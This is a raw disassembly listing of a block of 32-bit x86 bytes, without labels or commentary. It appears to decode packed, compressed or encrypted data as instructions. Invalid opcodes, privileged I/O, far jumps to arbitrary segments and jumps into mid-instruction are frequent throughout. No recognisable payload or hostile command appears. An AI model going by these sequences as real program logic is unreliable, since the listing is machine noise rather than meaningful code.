  4066df:	adc    DWORD PTR es:[ecx+ebp*8-0x53950b49],esp
  4066e7:	pop    edx
  4066e8:	or     BYTE PTR [eax-0x317dca6c],bh
  4066ee:	and    BYTE PTR [ebp-0x80],ah
  4066f1:	bound  edi,QWORD PTR [eax]
  4066f3:	mov    esp,0xe68a8183
  4066f8:	icebp  
  4066f9:	mov    eax,0xc98788f2
  4066fe:	cmp    edi,DWORD PTR [edx+edi*4]
  406701:	arpl   WORD PTR [edi],cx
  406703:	stos   DWORD PTR es:[edi],eax
  406704:	xor    ah,BYTE PTR ds:0xc1c750d
  40670a:	dec    edi
  40670b:	and    DWORD PTR ds:0x85e425b8,eax
  406711:	xchg   DWORD PTR [eax],ebx
  406713:	fcmovu st,st(1)
  406715:	xchg   esi,eax
  406716:	je     0x4066f2
  406718:	jmp    0x4066f1
  40671a:	imul   ebx,DWORD PTR [edx-0x22d1ba62],0x4774256d
  406724:	and    esp,esi
  406726:	and    al,0x31
  406728:	shl    DWORD PTR [edi-0x3b87648d],0xd5
  40672f:	mov    bh,0x9a
  406731:	mov    ah,BYTE PTR [edi+0x4609c2d2]
  406737:	lds    esi,FWORD PTR [ebx-0xbae43e7]
  40673d:	pop    ds
  40673e:	inc    ecx
  40673f:	cld    
  406740:	fidiv  DWORD PTR [ebp+eax*2+0x3df6ee75]
  406747:	xor    DWORD PTR [edi],ecx
  406749:	and    al,0x8d
  40674b:	mov    ecx,DWORD PTR [ebp+ecx*8+0x1d]
  40674f:	(bad)
  406752:	adc    DWORD PTR [ebp-0x750a6509],esi
  406758:	mov    eax,0xa425e6db
  40675d:	mov    ebx,DWORD PTR [ebx]
  40675f:	mov    bl,0xba
  406761:	or     BYTE PTR [ecx-0x43],dh
  406764:	dec    edx
  406765:	xchg   edi,eax
  406766:	shl    cl,1
  406768:	lea    esi,[ebx+0x4b38de4]
  40676e:	jns    0x40670a
  406770:	cs das 
  406772:	xchg   edx,eax
  406773:	xor    ch,BYTE PTR [edi+0xb]
  406776:	fdiv   QWORD PTR [esp+esi*1]
  406779:	adc    al,0x4d
  40677b:	add    cl,BYTE PTR [edi+0x58033432]
  406781:	ins    DWORD PTR es:[edi],dx
  406782:	push   esp
  406783:	test   DWORD PTR [edx],edx
  406785:	js     0x40670f
  406787:	jo     0x40679a
  406789:	sahf   
  40678a:	dec    ecx
  40678b:	inc    ebp
  40678c:	mov    edi,DWORD PTR [ebx]
  40678e:	xchg   ebx,eax
  40678f:	mov    edx,0x5d2cd675
  406794:	mov    gs,WORD PTR [eax+0x7b]
  406797:	ss ja  0x4067e4
  40679a:	or     eax,0x3e30876e
  40679f:	dec    edi
  4067a0:	mov    edx,0xa7b8e204
  4067a5:	lahf   
  4067a6:	pushf  
  4067a7:	aam    0xbd
  4067a9:	or     BYTE PTR [eax-0x49],dl
  4067ac:	inc    esi
  4067ad:	add    eax,0x290d85a0
  4067b2:	and    ah,BYTE PTR ds:0x636b48e4
  4067b8:	inc    ecx
  4067b9:	retf   0x1e58
  4067bc:	dec    eax
  4067bd:	sbb    bl,BYTE PTR [ebp+0x64]
  4067c0:	sbb    esp,DWORD PTR [edi-0x56]
  4067c3:	and    dh,BYTE PTR [eax]
  4067c5:	add    eax,0x5bb63f90
  4067ca:	jnp    0x4067eb
  4067cc:	fdiv   DWORD PTR [eax+0x2b48fa61]
  4067d2:	pop    esi
  4067d3:	xchg   ebx,eax
  4067d4:	push   ebx
  4067d5:	outs   dx,DWORD PTR ds:[esi]
  4067d6:	pop    edx
  4067d7:	mov    ch,0x3
  4067d9:	inc    eax
  4067da:	mov    eax,ds:0xad35b40f
  4067df:	(bad)  
  4067e0:	std    
  4067e1:	sub    al,0x50
  4067e3:	mov    eax,0x95ee0c97
  4067e8:	retf   0xc701
  4067eb:	shr    bl,0x9b
  4067ee:	fimul  WORD PTR [ebp+ebx*1-0x5375bd8e]
  4067f5:	adc    bl,bl
  4067f7:	push   ebp
  4067f8:	in     al,0xa9
  4067fa:	pushf  
  4067fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067fc:	fist   DWORD PTR ds:0x77a9ca6f
  406802:	dec    ebp
  406803:	popa   
  406804:	std    
  406805:	sbb    ah,bh
  406807:	(bad)  
  406808:	fsubr  QWORD PTR [ebp-0x2cbab70f]
  40680e:	pushf  
  40680f:	scas   al,BYTE PTR es:[edi]
  406810:	jge    0x4067db
  406812:	sub    al,0x2a
  406814:	lods   al,BYTE PTR ds:[esi]
  406815:	jb     0x4067b6
  406817:	mov    BYTE PTR [edi],al
  406819:	jg     0x4067c0
  40681b:	mov    esp,0x7f7b7bb1
  406820:	rcl    BYTE PTR [ebx+ebp*2+0x3cdd9e69],cl
  406827:	mov    cl,0x49
  406829:	out    dx,eax
  40682a:	fidiv  WORD PTR [ebx-0x57]
  40682d:	fdiv   QWORD PTR [ebx]
  40682f:	add    BYTE PTR [eax+0x78],cl
  406832:	sbb    al,0x65
  406834:	(bad)  
  406835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406836:	shl    BYTE PTR [ecx-0x6],0x5c
  40683a:	add    bh,0xcc
  40683d:	fisubr WORD PTR [ebx]
  40683f:	(bad)
  406843:	or     ecx,DWORD PTR [ebx-0x53]
  406846:	mov    DWORD PTR [esi],eax
  406848:	pop    es
  406849:	mov    ebx,0xee45b5a
  40684e:	dec    ebp
  40684f:	(bad)  
  406850:	sbb    al,0x44
  406852:	shr    DWORD PTR [ebp-0x451812d0],cl
  406858:	adc    BYTE PTR [esi+0x4592663],0xbb
  40685f:	clc    
  406860:	or     eax,0x80fbc104
  406865:	and    eax,DWORD PTR [ebx]
  406867:	mov    al,0xd9
  406869:	pusha  
  40686a:	bound  esp,QWORD PTR ds:0xbc376506
  406870:	enter  0x819e,0xe4
  406874:	(bad)  
  406876:	cli    
  406877:	cld    
  406878:	jg     0x406855
  40687a:	and    ecx,esp
  40687c:	leave  
  40687d:	retf   0x64af
  406880:	pop    ds
  406881:	cld    
  406882:	cmp    ebp,DWORD PTR [edx]
  406884:	cli    
  406885:	ror    DWORD PTR [ebp-0x71],1
  406888:	lods   al,BYTE PTR ds:[esi]
  406889:	mov    bl,0x2b
  40688b:	and    eax,0xc4881df2
  406890:	push   esi
  406891:	mov    ah,0x42
  406893:	push   0x7903e222
  406898:	pusha  
  406899:	jno    0x4068c8
  40689b:	push   0x8cc95cdf
  4068a0:	inc    eax
  4068a1:	in     al,0x25
  4068a3:	stos   DWORD PTR es:[edi],eax
  4068a4:	sbb    DWORD PTR [ecx+0x214cc087],ecx
  4068aa:	fst    QWORD PTR [edx-0x26a77024]
  4068b0:	sahf   
  4068b1:	inc    ebx
  4068b2:	pop    esi
  4068b3:	jg     0x406874
  4068b5:	cld    
  4068b6:	adc    ch,BYTE PTR [ecx]
  4068b8:	dec    ebx
  4068b9:	dec    eax
  4068ba:	jo     0x4068df
  4068bc:	lahf   
  4068bd:	in     al,dx
  4068be:	in     al,dx
  4068bf:	mov    bh,0x94
  4068c1:	add    eax,0x929e864e
  4068c6:	loope  0x406867
  4068c8:	scas   eax,DWORD PTR es:[edi]
  4068c9:	mov    eax,ds:0x50dae543
  4068ce:	call   0xc716dc46
  4068d3:	nop
  4068d4:	lahf   
  4068d5:	popa   
  4068d6:	icebp  
  4068d7:	retf   0x7807
  4068da:	sub    ebp,DWORD PTR [ebx+eax*4-0x17]
  4068de:	es dec edi
  4068e0:	lods   al,BYTE PTR ds:[esi]
  4068e1:	call   0x81605002
  4068e6:	lods   al,BYTE PTR ds:[esi]
  4068e7:	imul   eax,DWORD PTR [edx+0x2],0x62
  4068eb:	dec    eax
  4068ec:	fdivr  DWORD PTR [ebx-0x75e5e0f6]
  4068f2:	hlt    
  4068f3:	xchg   BYTE PTR [edx+ebp*8],bh
  4068f6:	cdq    
  4068f7:	pop    edi
  4068f8:	out    dx,eax
  4068f9:	xchg   ecx,eax
  4068fa:	jmp    0x40691c
  4068fc:	dec    eax
  4068fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068fe:	sbb    ah,cl
  406900:	add    eax,0xfea0c548
  406905:	test   BYTE PTR [ebp+0x2b],dh
  406908:	into   
  406909:	(bad)
  40690d:	test   eax,0xa86a4bcb
  406912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406913:	jae    0x40691c
  406915:	jl     0x406973
  406917:	xchg   bh,ch
  406919:	cld    
  40691a:	clc    
  40691b:	scas   eax,DWORD PTR es:[edi]
  40691c:	or     BYTE PTR [edi+0x464189a7],0xb3
  406923:	cmp    eax,esi
  406925:	dec    ebp
  406926:	adc    al,0x89
  406928:	sub    ebp,esi
  40692a:	xchg   edi,eax
  40692b:	loop   0x4068bf
  40692d:	(bad)  [edi-0x5dedb92a]
  406933:	pushf  
  406934:	ss pop esp
  406936:	pop    esi
  406937:	pop    es
  406938:	fisub  DWORD PTR [ecx]
  40693a:	retf   
  40693b:	sbb    dh,BYTE PTR [eax+esi*8-0x18]
  40693f:	outs   dx,DWORD PTR ds:[esi]
  406940:	icebp  
  406941:	pop    ebp
  406942:	ja     0x40699f
  406944:	pop    edx
  406945:	xchg   edi,eax
  406946:	adc    dh,dh
  406948:	pop    esi
  406949:	pop    ds
  40694a:	and    ah,dh
  40694c:	push   es
  40694d:	test   DWORD PTR [ebx+0x6c],eax
  406950:	stc    
  406951:	mov    ss:0x39f7734b,al
  406957:	clc    
  406958:	je     0x4069b1
  40695a:	xchg   ecx,eax
  40695b:	scas   al,BYTE PTR es:[edi]
  40695c:	cmp    dh,bl
  40695e:	fnstcw WORD PTR [ecx]
  406960:	jnp    0x40697b
  406962:	pop    ecx
  406963:	sar    BYTE PTR [edi+0x1da44139],cl
  406969:	test   DWORD PTR [esi+0x21d03a99],0x502c3bf1
  406973:	xchg   edi,eax
  406974:	jns    0x4069c8
  406976:	push   ebx
  406977:	mov    WORD PTR [esi+0xd],ss
  40697a:	test   BYTE PTR [ecx+ecx*4],cl
  40697d:	imul   BYTE PTR [esi]
  40697f:	rcr    BYTE PTR [eax+0xc],1
  406982:	(bad)  
  406983:	cmp    cl,BYTE PTR [edx+0x70]
  406986:	xor    bh,bl
  406988:	ret    0x4324
  40698b:	sti    
  40698c:	popa   
  40698d:	mov    ecx,0x8a649cde
  406992:	int3   
  406993:	out    dx,eax
  406994:	add    ch,BYTE PTR [ecx+0x38]
  406997:	cmp    eax,0xae210b6d
  40699c:	int    0xa
  40699e:	mov    ?,WORD PTR [esi+eax*8-0x5a]
  4069a2:	dec    esp
  4069a3:	into   
  4069a4:	into   
  4069a5:	cmp    ch,BYTE PTR [ebx+0x67]
  4069a8:	mov    WORD PTR [esi+0xc],cs
  4069ab:	pop    ebp
  4069ac:	xor    esp,DWORD PTR [ebx-0x56bf726d]
  4069b2:	int    0x43
  4069b4:	add    al,ah
  4069b6:	and    DWORD PTR [esi-0x389a7774],esi
  4069bc:	in     eax,dx
  4069bd:	cmp    esi,DWORD PTR [edi+edx*8-0x175cf50d]
  4069c4:	jg     0x4069f4
  4069c6:	fild   DWORD PTR [edx]
  4069c8:	(bad)  [edx]
  4069ca:	test   DWORD PTR [ecx+0x71],esp
  4069cd:	retf   0x486
  4069d0:	and    esi,0xffffffcd
  4069d3:	lods   eax,DWORD PTR ds:[esi]
  4069d4:	rol    DWORD PTR [edi-0x67],1
  4069d7:	adc    BYTE PTR [edi-0x2385bd73],0x7b
  4069de:	call   0xf934:0xe72909b9
  4069e5:	inc    DWORD PTR [edx-0x3aa3473]
  4069eb:	cmc    
  4069ec:	jbe    0x406970
  4069ee:	sub    bl,BYTE PTR [ecx+0x55f37387]
  4069f4:	inc    ebp
  4069f5:	sub    al,BYTE PTR [edx+0x1b491821]
  4069fb:	in     eax,dx
  4069fc:	rcl    esi,1
  4069fe:	inc    ebp
  4069ff:	mov    edx,0xd56c4f
  406a04:	mov    ?,WORD PTR gs:[ebx-0x6756d745]
  406a0b:	adc    al,0x9f
  406a0d:	lahf   
  406a0e:	(bad)  
  406a0f:	cmp    al,0xc0
  406a11:	loop   0x4069f2
  406a13:	inc    edx
  406a14:	loopne 0x406a57
  406a16:	in     eax,dx
  406a17:	mov    ebp,0x246653e3
  406a1c:	pop    ds
  406a1d:	push   ds
  406a1e:	repnz mov dl,0x51
  406a21:	enter  0x4474,0xdc
  406a25:	in     eax,0xa3
  406a27:	jno    0x4069c5
  406a29:	fild   QWORD PTR [ebp+ebp*4-0x79855c9a]
  406a30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a31:	push   ecx
  406a32:	and    ch,BYTE PTR [edx-0x2e]
  406a35:	hlt    
  406a36:	adc    eax,0xade5bcc5
  406a3b:	sbb    BYTE PTR [ebp+edx*8+0x1aa1ee6d],ah
  406a42:	add    al,dl
  406a44:	sbb    edi,DWORD PTR [eax]
  406a46:	inc    esp
  406a47:	sar    BYTE PTR [esi-0x79dd7857],1
  406a4d:	push   eax
  406a4e:	jnp    0x406a81
  406a50:	cld    
  406a51:	shl    BYTE PTR [edx],0xe5
  406a54:	jns    0x406a6c
  406a56:	jg     0x406a4a
  406a58:	icebp  
  406a59:	loope  0x4069ee
  406a5b:	das    
  406a5c:	cmp    edx,edx
  406a5e:	mov    al,0x67
  406a60:	xor    bl,BYTE PTR [ebx]
  406a62:	loopne 0x406a5f
  406a64:	rol    BYTE PTR [ebx],cl
  406a66:	fnstenv ds:0x4fc4dde4
  406a6c:	adc    edx,DWORD PTR [edi]
  406a6e:	jae    0x406ac6
  406a70:	ret    
  406a71:	sub    DWORD PTR [eax+0x29984a32],eax
  406a77:	xor    ah,BYTE PTR [edi+edi*8+0x5d8e525d]
  406a7e:	push   eax
  406a7f:	call   0xfc21:0x1de642fe
  406a86:	out    0xbb,eax
  406a88:	fcomip st,st(1)
  406a8a:	push   edx
  406a8b:	xor    al,0x94
  406a8d:	loopne 0x406afc
  406a8f:	push   ss
  406a90:	or     BYTE PTR [edi],ah
  406a92:	les    edx,FWORD PTR [edi+edi*2+0x255242cb]
  406a99:	in     eax,0xc3
  406a9b:	shl    BYTE PTR [ebx*1-0x55fa5039],0xf6
  406aa3:	mov    ds:0x98bfd4fb,al
  406aa8:	fucom  st(4)
  406aaa:	sti    
  406aab:	das    
  406aac:	xchg   DWORD PTR [ecx],edx
  406aae:	jne    0x406ab6
  406ab0:	lea    esp,[edx]
  406ab2:	push   es
  406ab3:	out    dx,eax
  406ab4:	ret    
  406ab5:	dec    edi
  406ab6:	mov    eax,ds:0x626bc864
  406abb:	and    DWORD PTR [eax],edi
  406abd:	aaa    
  406abe:	cmc    
  406abf:	xchg   ebp,eax
  406ac0:	hlt    
  406ac1:	xchg   ebp,eax
  406ac2:	push   ebx
  406ac3:	push   es
  406ac4:	push   ebx
  406ac5:	add    DWORD PTR [ebp-0x1f95796a],edi
  406acb:	retf   0xc5d0
  406ace:	loope  0x406a72
  406ad0:	shr    DWORD PTR [esi-0x52],0xb9
  406ad4:	lods   eax,DWORD PTR ds:[esi]
  406ad5:	fwait
  406ad6:	enter  0xf4ff,0x7b
  406ada:	xlat   BYTE PTR ds:[ebx]
  406adb:	scas   eax,DWORD PTR es:[edi]
  406adc:	push   0xffffff94
  406ade:	jns    0x406a95
  406ae0:	lods   eax,DWORD PTR ds:[esi]
  406ae1:	pop    ss
  406ae2:	jns    0x406b11
  406ae4:	div    BYTE PTR [esi+0x792a541]
  406aea:	in     al,0x82
  406aec:	cmp    bl,dl
  406aee:	pop    esi
  406aef:	pop    eax
  406af0:	mov    bh,0x6a
  406af2:	ds ins BYTE PTR es:[edi],dx
  406af4:	adc    DWORD PTR [ebp+0xe],0x1c
  406af8:	jo     0x406ac6
  406afa:	mov    cs,WORD PTR [eax-0x6455e35c]
  406b00:	test   eax,0xe935276c
  406b05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b06:	or     al,0x94
  406b08:	test   DWORD PTR [edx+ebx*4-0x4d],esp
  406b0c:	cmp    dh,bh
  406b0e:	sahf   
  406b0f:	mov    eax,0x3cccde5a
  406b14:	pop    esi
  406b15:	push   ebp
  406b16:	cmp    ebx,edx
  406b18:	mov    esp,0x41d6f13f
  406b1d:	mov    eax,ds:0x411c7f6a
  406b22:	mov    ds:0x3eb1b4b6,eax
  406b27:	std    
  406b28:	inc    edi
  406b29:	dec    ecx
  406b2a:	and    eax,ebp
  406b2c:	pusha  
  406b2d:	(bad)  
  406b2e:	lods   al,BYTE PTR ds:[esi]
  406b2f:	jl     0x406b58
  406b31:	xchg   esi,eax
  406b32:	pop    esi
  406b33:	outs   dx,BYTE PTR ds:[esi]
  406b34:	in     al,0xa8
  406b36:	mov    esp,0xe7d19a41
  406b3b:	div    BYTE PTR [ebp-0x77056388]
  406b41:	cmp    DWORD PTR ds:0x60d82b09,0xb107cf6d
  406b4b:	daa    
  406b4c:	rcl    ecx,0xfc
  406b4f:	shr    BYTE PTR [ebx+esi*1-0x77add420],cl
  406b56:	or     edx,ebp
  406b58:	retf   
  406b59:	ret    0x9b3d
  406b5c:	sub    DWORD PTR [ebx],edi
  406b5e:	xchg   ebp,eax
  406b5f:	(bad)
  406b62:	xchg   edi,eax
  406b63:	and    bh,dl
  406b65:	jmp    0x972f:0xd3a4cc91
  406b6c:	cmp    al,0x80
  406b6e:	fsubr  DWORD PTR [esi]
  406b70:	cmp    al,0x6
  406b72:	jo     0x406b52
  406b74:	jb     0x406ba7
  406b76:	sub    BYTE PTR ds:0x7cc0f246,ah
  406b7c:	es stc 
  406b7e:	mov    ecx,0xa474b904
  406b83:	add    al,0x23
  406b85:	mov    eax,ds:0x31b6e582
  406b8a:	sub    eax,0xad0bb3fa
  406b8f:	pusha  
  406b90:	popa   
  406b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b92:	shr    DWORD PTR gs:[ecx],0xc3
  406b96:	stos   DWORD PTR es:[edi],eax
  406b97:	out    0xf8,eax
  406b99:	mov    ah,0xca
  406b9b:	or     al,0xbb
  406b9d:	in     al,0xa4
  406b9f:	sbb    eax,0x2b673e1
  406ba4:	mov    bl,0x69
  406ba6:	pop    ds
  406ba7:	push   edi
  406ba8:	xchg   esi,eax
  406ba9:	lods   eax,DWORD PTR ds:[esi]
  406baa:	pop    es
  406bab:	fiadd  WORD PTR [edi-0x5]
  406bae:	nop
  406baf:	pop    esp
  406bb0:	mov    ah,0x34
  406bb2:	inc    ebp
  406bb3:	xor    eax,0x61d23003
  406bb8:	jg     0x406b97
  406bba:	ret    
  406bbb:	test   DWORD PTR [edx+edi*8+0x6387e65a],0xe114d2c0
  406bc6:	leave  
  406bc7:	xlat   BYTE PTR ds:[bx]
  406bc9:	icebp  
  406bca:	add    edx,ebx
  406bcc:	in     al,dx
  406bcd:	push   eax
  406bce:	or     DWORD PTR [ebx+0x6d973831],0xffffff9e
  406bd5:	clc    
  406bd6:	dec    ecx
  406bd7:	jno    0x406bcd
  406bd9:	aaa    
  406bda:	lock bound edx,QWORD PTR [eax+0x20]
  406bde:	scas   al,BYTE PTR es:[edi]
  406bdf:	pop    ss
  406be0:	shl    dh,0x6f
  406be3:	in     eax,dx
  406be4:	iret   
  406be5:	bnd jmp 0x3c8c44a4
  406beb:	inc    ebx
  406bec:	cwde   
  406bed:	data16 xor al,0xa2
  406bf0:	xor    eax,0xe04e13b4
  406bf5:	ss pop esp
  406bf7:	pop    ebx
  406bf8:	mov    al,ds:0x32ffd60a
  406bfd:	stos   DWORD PTR es:[edi],eax
  406bfe:	sub    cl,BYTE PTR [ebp*4+0x5be5573d]
  406c05:	jmp    0xe8bc:0xfb231d02
  406c0c:	pop    ecx
  406c0d:	xor    DWORD PTR [edx-0x42],0xb067ae77
  406c14:	dec    esi
  406c15:	or     esi,esi
  406c17:	rcr    BYTE PTR [ecx-0x2c5a4712],1
  406c1d:	push   0xf3765629
  406c22:	push   esp
  406c23:	mov    dh,0x5e
  406c25:	and    BYTE PTR [ecx-0x35b4393d],cl
  406c2b:	or     BYTE PTR [eax+0x7a50b160],ch
  406c31:	or     DWORD PTR [eax],eax
  406c33:	xchg   BYTE PTR [ecx+0x8],cl
  406c36:	std    
  406c37:	xchg   edi,eax
  406c38:	push   esp
  406c39:	jle    0x406c8e
  406c3b:	or     BYTE PTR [edi+0x49],dh
  406c3e:	sar    DWORD PTR [ecx-0x67dbb34c],cl
  406c44:	popa   
  406c45:	outs   dx,DWORD PTR ds:[esi]
  406c46:	sub    BYTE PTR [ecx],cl
  406c48:	fwait
  406c49:	(bad)  
  406c4a:	mov    cl,0x3b
  406c4c:	shl    edi,cl
  406c4e:	arpl   WORD PTR [ecx],dx
  406c50:	or     edx,DWORD PTR [ebp+0x7a]
  406c53:	add    edi,0x8f6e1bb
  406c59:	sbb    eax,0x393234ef
  406c5e:	cmc    
  406c5f:	or     bl,cl
  406c61:	and    eax,edx
  406c63:	push   ds
  406c64:	(bad)  
  406c65:	push   esi
  406c66:	aaa    
  406c67:	mov    dh,0xe9
  406c69:	adc    BYTE PTR [esi-0x5d],0x49
  406c6d:	retf   
  406c6e:	aam    0x6e
  406c70:	in     eax,dx
  406c71:	mov    DWORD PTR [eax+0x2721492c],ebp
  406c77:	jno    0x406ce3
  406c79:	scas   al,BYTE PTR es:[edi]
  406c7a:	repnz repz inc ebx
  406c7d:	sub    ah,BYTE PTR [esi-0x4195a129]
  406c83:	je     0x406cdf
  406c85:	push   edi
  406c86:	cdq    
  406c87:	es stos DWORD PTR es:[edi],eax
  406c89:	jg     0x406cb0
  406c8b:	pop    ecx
  406c8c:	retf   
  406c8d:	retf   0xfcc5
  406c90:	(bad)  
  406c91:	int3   
  406c92:	pop    ebx
  406c93:	mov    ds:0xfe634737,eax
  406c98:	je     0x406c96
  406c9a:	dec    ebp
  406c9b:	popf   
  406c9c:	fsub   QWORD PTR ds:0xc6a902ec
  406ca2:	xor    BYTE PTR [edx+0x6d3dfc80],0xda
  406ca9:	popa   
  406caa:	popf   
  406cab:	outs   dx,DWORD PTR ds:[esi]
  406cac:	add    ecx,esi
  406cae:	mov    esp,0x4ef59058
  406cb3:	mov    dh,cl
  406cb5:	into   
  406cb6:	add    DWORD PTR [ecx],ebx
  406cb8:	or     DWORD PTR ds:[edx+0x34e94136],esp
  406cbf:	shr    ch,cl
  406cc1:	and    DWORD PTR [eax+0x2b],ebx
  406cc4:	mov    ecx,0xf2032704
  406cc9:	dec    esp
  406cca:	dec    esi
  406ccb:	jb     0x406c5f
  406ccd:	xor    edx,DWORD PTR [ecx]
  406ccf:	arpl   WORD PTR [edx+0x2b],ax
  406cd2:	pop    esp
  406cd3:	iret   
  406cd4:	test   eax,0x98ad684c
  406cd9:	sti    
  406cda:	jmp    0x406c60
  406cdc:	jecxz  0x406d0b
  406cde:	mov    al,ds:0x62f45f50
  406ce3:	xor    ebx,DWORD PTR [ebp-0x11101393]
  406ce9:	push   esp
  406cea:	xchg   DWORD PTR [edi+ebx*2+0x52b54a0d],ebp
  406cf1:	jb     0x406cc2
  406cf3:	icebp  
  406cf4:	stos   BYTE PTR es:[edi],al
  406cf5:	lea    ecx,[ecx]
  406cf7:	ret    0x8fa9
  406cfa:	loope  0x406d5e
  406cfc:	bound  ebp,QWORD PTR [ebx-0x3eef7c13]
  406d02:	fs jp  0x406c94
  406d05:	jb     0x406d63
  406d07:	pop    ebp
  406d08:	stos   BYTE PTR es:[edi],al
  406d09:	mov    ss,WORD PTR ds:0xf0f3ed62
  406d0f:	push   eax
  406d10:	jns    0x406d1a
  406d12:	popf   
  406d13:	mov    bh,0x3
  406d15:	mov    al,0xa3
  406d17:	inc    edi
  406d18:	and    bl,al
  406d1a:	pusha  
  406d1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d1c:	mov    al,BYTE PTR [edx+0x3d]
  406d1f:	test   edx,eax
  406d21:	mov    edx,0xff9f73da
  406d26:	rcl    ebp,0x64
  406d29:	mov    esp,0xe9ee521a
  406d2e:	iret   
  406d2f:	xchg   edx,edx
  406d31:	mov    eax,ds:0x77867f19
  406d36:	test   ebp,esi
  406d38:	sbb    eax,ebx
  406d3a:	(bad)  
  406d3b:	mov    esi,0xfb42854a
  406d40:	(bad)  
  406d41:	lahf   
  406d42:	jle    0x406ccf
  406d44:	les    di,DWORD PTR [edi+0xf]
  406d48:	adc    DWORD PTR [esi-0x7329ac27],ebp
  406d4e:	xchg   DWORD PTR [edi-0x2],ebx
  406d51:	repz jne 0x406d74
  406d54:	ret    0x42bb
  406d57:	aam    0x47
  406d59:	xchg   edx,eax
  406d5a:	or     ah,BYTE PTR [esi+0x5e]
  406d5d:	sub    al,0x3e
  406d5f:	mov    ecx,0xaa493c5c
  406d64:	shr    BYTE PTR [ebp+0x10],cl
  406d67:	adc    al,0x17
  406d69:	rcr    DWORD PTR [edi+eax*2+0x25],1
  406d6d:	pop    DWORD PTR [esi]
  406d6f:	xchg   ebx,eax
  406d70:	inc    edi
  406d71:	int    0xa
  406d73:	xchg   ebx,edx
  406d75:	pop    edi
  406d76:	jle    0x406d71
  406d78:	scas   al,BYTE PTR es:[edi]
  406d79:	out    0x45,al
  406d7b:	daa    
  406d7c:	mov    ah,BYTE PTR [esi-0x51afaa76]
  406d82:	lods   eax,DWORD PTR ds:[esi]
  406d83:	add    BYTE PTR [ebx-0x7221cd11],ah
  406d89:	dec    ecx
  406d8a:	inc    ecx
  406d8b:	arpl   WORD PTR [ebp+ebx*4-0x4deec89],bp
  406d92:	mov    ebp,0xccf6d14
  406d97:	dec    ebp
  406d98:	sub    eax,0xe693f666
  406d9d:	jl     0x406d5e
  406d9f:	push   ebp
  406da0:	(bad)  
  406da1:	shr    DWORD PTR [edi],0x84
  406da4:	xchg   ebx,eax
  406da5:	ficom  WORD PTR [ebp+0x887538d]
  406dab:	push   esi
  406dac:	mov    ah,bh
  406dae:	push   es
  406daf:	mov    dl,0x1
  406db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406db2:	dec    esi
  406db3:	push   esi
  406db4:	jecxz  0x406d8b
  406db6:	sahf   
  406db7:	das    
  406db8:	enter  0xc6e5,0xb4
  406dbc:	jno    0x406d7c
  406dbe:	pop    es
  406dbf:	mov    ebx,esi
  406dc1:	jmp    0xf77b:0x760ec40f
  406dc8:	pushf  
  406dc9:	aaa    
  406dca:	outs   dx,BYTE PTR ds:[esi]
  406dcb:	out    0x5e,eax
  406dcd:	mov    ebp,DWORD PTR [eax+0x22f6a433]
  406dd3:	add    BYTE PTR [ebp+0x73a48f15],ah
  406dd9:	mov    eax,ds:0x5c407985
  406dde:	clc    
  406ddf:	and    BYTE PTR [edi+0x50],al
  406de2:	push   edi
  406de3:	mov    ebp,0x4279bc9c
  406de8:	mov    ebx,DWORD PTR [eax]
  406dea:	pop    esp
  406deb:	(bad)  
  406dec:	mov    DWORD PTR cs:0x5a80ec54,esp
  406df3:	cmp    eax,0xd605c32
  406df8:	sar    ebp,1
  406dfa:	pop    ebx
  406dfb:	std    
  406dfc:	adc    ebp,DWORD PTR [edi]
  406dfe:	mov    ch,0x7e
  406e00:	inc    ecx
  406e01:	fstp   st(1)
  406e03:	adc    eax,0x6c594d73
  406e08:	push   edi
  406e09:	out    0x61,al
  406e0b:	out    dx,al
  406e0c:	push   ss
  406e0d:	push   0x466b4dd1
  406e12:	mov    ds:0x9c84b46f,al
  406e17:	jl     0x406e2e
  406e19:	inc    edi
  406e1a:	leave  
  406e1b:	lea    ecx,[esp+ebp*8]
  406e1e:	outs   dx,DWORD PTR ds:[esi]
  406e1f:	clc    
  406e20:	shr    BYTE PTR [esi+0x84e0362],cl
  406e26:	rcl    dh,cl
  406e28:	mov    esi,0xc1fbff3e
  406e2d:	cli    
  406e2e:	enter  0xb805,0x32
  406e32:	sub    edx,DWORD PTR es:[esi+0x3d9e2ada]
  406e39:	retf   
  406e3a:	test   esp,0x8c05708
  406e40:	jl     0x406ea9
  406e42:	or     ebp,edi
  406e44:	neg    ah
  406e46:	mov    ds:0xc8ec287d,eax
  406e4b:	les    ebp,FWORD PTR [eax+edi*8-0x2a846f57]
  406e52:	sub    dh,BYTE PTR [esi+0x6e384c01]
  406e58:	pop    ecx
  406e59:	mov    ebp,0xc7b3c669
  406e5e:	test   al,0x38
  406e60:	loope  0x406ea0
  406e62:	in     eax,dx
  406e63:	mov    cl,0x82
  406e65:	sbb    bh,BYTE PTR [esi+0x2e]
  406e68:	adc    al,0xe5
  406e6a:	inc    ecx
  406e6b:	std    
  406e6c:	dec    ebp
  406e6d:	jle    0x406eac
  406e6f:	adc    BYTE PTR [esi+ecx*2+0x700323bc],ah
  406e76:	or     eax,DWORD PTR [ecx-0x4af90b8a]
  406e7c:	add    bh,BYTE PTR [edi-0x203c40aa]
  406e82:	push   edi
  406e83:	ret    
  406e84:	or     dl,BYTE PTR [ebx]
  406e86:	ds push cs
  406e88:	fwait
  406e89:	push   ecx
  406e8a:	push   esp
  406e8b:	or     eax,0x5352601d
  406e90:	rcr    DWORD PTR [ecx-0x5c],1
  406e93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e94:	push   esi
  406e95:	scas   eax,DWORD PTR es:[edi]
  406e96:	xor    edi,DWORD PTR [ebx+ecx*2-0x6af37d04]
  406e9d:	in     al,0x3d
  406e9f:	mul    DWORD PTR [esi+0xabe76c0]
  406ea5:	(bad)  
  406ea6:	int    0xa2
  406ea8:	shl    DWORD PTR [ecx+0x41],0xbe
  406eac:	in     eax,0xfe
  406eae:	sub    edx,DWORD PTR ds:0x7aa5d489
  406eb4:	lea    ebp,[ebx+0x37]
  406eb7:	mov    ds:0x8bf7d925,al
  406ebc:	retf   
  406ebd:	hlt    
  406ebe:	mov    ah,0x85
